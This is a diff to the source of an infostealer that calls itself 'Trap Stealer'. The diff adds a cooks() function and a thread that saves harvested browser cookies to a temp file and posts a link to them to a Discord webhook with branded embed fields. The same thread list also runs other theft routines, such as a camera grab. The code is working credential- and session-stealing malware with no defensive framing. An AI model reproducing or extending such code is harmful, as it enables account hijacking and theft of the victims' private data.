@@ -1008,6 +1008,7 @@ def paaz():
         }
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
     except:pass
+def cooks():
     try:
         file = os.getenv("TEMP") + f"\wpcook.txt"
         filename = "wpcook.txt"
@@ -1016,28 +1017,27 @@ def paaz():
         embed_fields = [{"name": f"{filename}", "value": f"[Click here to download]({a})"}]
         pas = 'eikooC'
         data = {
-            "username": "Trap Stealer",
-            "content": "",
-            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
-            "embeds": [
-                {
-                    "title": f"🍪 Trap Stealer {pas[::-1]}",
-                    "description": f"Number of {pas[::-1]} : {coonum}",
-                    "color": 0xffb6c1,
-                    "fields": embed_fields,
-                    "thumbnail": {
-                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
-                    },
-                    "footer": {
-                        "text": "Trap Stealer | https://github.com/TheCuteOwl",
-                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                "username": "Trap Stealer",
+                "content": "",
+                "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+                "embeds": [
+                    {
+                        "title": f"🍪 Trap Stealer {pas[::-1]}",
+                        "description": f"Number of {pas[::-1]} : {coonum}",
+                        "color": 0xffb6c1,
+                        "fields": embed_fields,
+                        "thumbnail": {
+                            "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                        },
+                        "footer": {
+                            "text": "Trap Stealer | https://github.com/TheCuteOwl",
+                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
+                        }
                     }
-                }
-            ]
-        }
+                ]
+            }
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
     except:pass
-
 coonum = 0
 def getcook():
     global coonum
@@ -1084,7 +1084,7 @@ def getcook():
                         cookies.append({'host':row[0],'name':row[1],'path':row[2],'value':cookie,'expires':row[4]})
                 conn.close()
             except:pass
-
+    writeforfile(cookies, 'cook')
             
 def GatherZips(paths1, paths2, paths3):
     thttht = []
@@ -1227,6 +1227,10 @@ def GatherAll():
     paz = threading.Thread(target=paaz)
     paz.start()
     Threadlist.append(paz)
+    
+    coss = threading.Thread(target=cooks)
+    coss.start()
+    Threadlist.append(coss)
     
     cam = threading.Thread(target=Camera_get)
     cam.start()
